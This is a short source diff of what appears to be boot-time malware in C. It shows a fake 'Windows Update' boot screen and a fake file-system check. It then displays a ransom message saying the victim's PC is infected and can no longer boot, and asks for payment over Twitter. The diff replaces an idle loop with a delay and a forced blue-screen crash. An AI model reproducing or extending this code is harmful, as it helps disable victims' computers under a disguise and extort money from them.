@@ -6,6 +6,7 @@
 #include "tools.h"
 
 void NtEntry(){
+    // self explanatory
     RtlDrawBootText(L"Please wait while Windows Update gets itself ready...\n");
     RtlSleep(6000);
     RtlDrawTextOnBluescreenScreen(L"Checking file system of C:\nType of File System is NTFS\n\n");
@@ -21,5 +22,7 @@ void NtEntry(){
     RtlDrawTextOnBluescreenScreen(L"YOU HAVE BEEN INFECTED BY [insert random creative name]\n\n");
     RtlDrawTextOnBluescreenScreen(L"If you got this, well idk what you want me to do, but uh you can't boot to your machine anymore\n");
     RtlDrawTextOnBluescreenScreen(L"Idk message me in twitter and pay me a buck and ill give you the way to fix your PC\n\n");
-    while(1){continue;}
+    RtlSleep(30000);
+    RtlStartBlueScreen();
+
 }
